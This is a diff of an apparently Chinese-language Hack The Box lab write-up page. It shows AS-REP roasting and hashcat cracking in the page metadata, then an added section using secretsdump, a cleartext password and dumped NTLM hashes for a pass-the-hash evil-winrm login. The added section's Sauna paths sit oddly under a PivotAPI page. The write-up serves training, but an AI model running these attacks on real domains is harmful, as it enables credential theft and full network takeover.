@@ -44,7 +44,7 @@
   <meta itemprop="description" content="GetNPUsers.py 使用 GetNPUsers.py 查看是否有用户禁用了 Kerberos 预认证。 ┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb] └─$ GetNPUsers.py -no-pass -dc-ip 10.129.228.115 LicorDeBellota.htb/ -usersfile users.txt Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02 [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] User jari doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User administrador doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User sshd doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set 用 hashcat 爆破出 hash 的值为 Roper4155。 ┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb] └─$ hashcat -m 18200 kaorz.hash /usr/share/wordlists/rockyou.txt hashcat (v7.1.2) starting OpenCL API (OpenCL 3.0 PoCL 6.0&#43;debian Linux, None&#43;Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ==================================================================================================================================================== * Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU /home/kali/.local/share/hashcat/hashcat.dictstat2: Outdated header version, ignoring content Minimum password length supported by kernel: 0 Maximum password length supported by kernel: 256 Minimum salt length supported by kernel: 0 Maximum salt length supported by kernel: 256 Hashes: 1 digests; 1 unique digests, 1 unique salts Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates Rules: 1 Optimizers applied: * Zero-Byte * Not-Iterated * Single-Hash * Single-Salt ATTENTION! Pure (unoptimized) backend kernels selected. Pure kernels can crack longer passwords, but drastically reduce performance. If you want to switch to optimized kernels, append -O to your commandline. See the above message to find out about the exact limits. Watchdog: Temperature abort trigger set to 90c Host memory allocated for this attack: 514 MB (27813 MB free) Dictionary cache built: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344392 * Bytes.....: 139921507 * Keyspace..: 14344385 * Runtime...: 1 sec $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68b6b688935e9299d9c217$f9d7a53d1f3afd2ea861b0480a08aae6ad1c2000d9dc46b7d88daa30247ae7e5c664e9531bcde1122b46cb461128b0f09b324df9a4e47a10f98d5f9d6ace1035255024b6b11ed8d4be7531a41494ebd95d7a6b4432daa90bcdc4a11ab2b0f371f9c66fbc89927c1a6775512bcf9af84d9da44f20c42e053c201c2b729b902fe4b86805fb3ac1e54545c923ec87360d899532525c901b70ee5c1624ccdfb3af4b215bf9680fc278146037eab8aa414da55bc0cb65f7588b4b13f94f23ac171f765e97ec271d741af42559f921d7050cb89b9881bd2c283b4342e4ec978c2a8d0535ac0ddfab9fb6c533007beacaa2a17d6af34deca8bd1c02:Roper4155 Session..........: hashcat Status...........: Cracked Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP) Hash.Target......: $krb5asrep$23$Kaorz@LICORDEBELLOTA.HTB:f5d49c34cd68...bd1c02 Time.Started.....: Tue Apr 7 11:07:11 2026 (3 secs) Time.Estimated...: Tue Apr 7 11:07:14 2026 (0 secs) Kernel.Feature...: Pure Kernel (password length 0-256 bytes) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#01........: 3550.5 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 10674176/14344385 (74.41%) Rejected.........: 0/10674176 (0.00%) Restore.Point....: 10665984/14344385 (74.36%) Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#01...: Ryanpenis -&gt; RipBean Hardware.Mon.#01.: Util: 62% Started: Tue Apr 7 11:06:52 2026 Stopped: Tue Apr 7 11:07:14 2026 使用爆破出来的 hash 进一步枚举。 ┌──(kali㉿kali)-[~/Work/Kali/PivotAPI/licordebellota.htb] └─$ GetUserSPNs.py -dc-ip 10.129.228.115 LicorDeBellota.htb/Kaorz:Roper4155 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies No entries found! GetUserSPNs 使用 GetUserSPNs 枚举注册了 SPN 的域用户，发现有 Administrator。">
   <meta itemprop="datePublished" content="2026-04-13T14:00:00+08:00">
   <meta itemprop="dateModified" content="2026-04-13T14:00:00+08:00">
-  <meta itemprop="wordCount" content="731">
+  <meta itemprop="wordCount" content="855">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -134,6 +134,7 @@
   <ul>
     <li><a href="#getnpuserspy">GetNPUsers.py</a></li>
     <li><a href="#getuserspns">GetUserSPNs</a></li>
+    <li><a href="#securetsdump">Securetsdump</a></li>
   </ul>
 </nav>
                 </aside>
@@ -315,6 +316,55 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Started: Tue Apr <span style="color:#ae81ff">14</span> 07:52:37 <span style="color:#ae81ff">2026</span>
 </span></span><span style="display:flex;"><span>Stopped: Tue Apr <span style="color:#ae81ff">14</span> 07:52:53 <span style="color:#ae81ff">2026</span>
+</span></span></code></pre></div><h2 id="securetsdump">Securetsdump</h2>
+<p>执行 <code>secretsdump</code> 暴露出 <code>administrator</code> 的 hash。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-secretsdump -just-dc egotistical-bank.local/svc_loanmgr:<span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>@10.129.22.120
+</span></span><span style="display:flex;"><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+</span></span><span style="display:flex;"><span>SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:107983a00ee44777ecd57b33b6caed05:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:fb8f321c64cea87f
+</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\H</span>Smith:des-cbc-md5:1c73b99168d3f8c7
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\F</span>Smith:des-cbc-md5:b50e02ab0d85f76b
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+</span></span><span style="display:flex;"><span>EGOTISTICAL-BANK.LOCAL<span style="color:#ae81ff">\s</span>vc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+</span></span><span style="display:flex;"><span>SAUNA$:aes256-cts-hmac-sha1-96:9494462d4080b6a0abcef757f627c17b2aa14822ea0ef7281ed1a46119bfc950
+</span></span><span style="display:flex;"><span>SAUNA$:aes128-cts-hmac-sha1-96:ce8abe15851e50bcfa804121824bae56
+</span></span><span style="display:flex;"><span>SAUNA$:des-cbc-md5:89237a5dfed60416
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Cleaning up...
+</span></span></code></pre></div><p>登陆拿到权限 root flag。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Sauna<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.22.120 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>5183e6faa81a508920196120306ef1c2
 </span></span></code></pre></div>
             </div>
         </article>
